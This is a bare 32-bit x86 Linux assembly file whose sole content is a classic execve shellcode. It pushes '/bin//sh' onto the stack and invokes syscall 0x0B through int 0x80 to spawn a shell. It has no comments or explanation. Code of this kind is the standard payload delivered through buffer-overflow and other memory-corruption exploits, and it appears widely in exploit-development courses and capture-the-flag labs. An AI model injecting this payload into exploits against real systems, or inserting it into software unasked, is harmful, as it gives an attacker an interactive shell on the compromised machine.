BITS 32

global _start

_start:
	xor 	ecx, ecx
	xor 	edx, edx
	push 	edx
	push 	"//sh"
	push 	"/bin"
	mov 	ebx, esp
	xor 	eax, eax
	mov 	al, 0Bh
	int 	80h
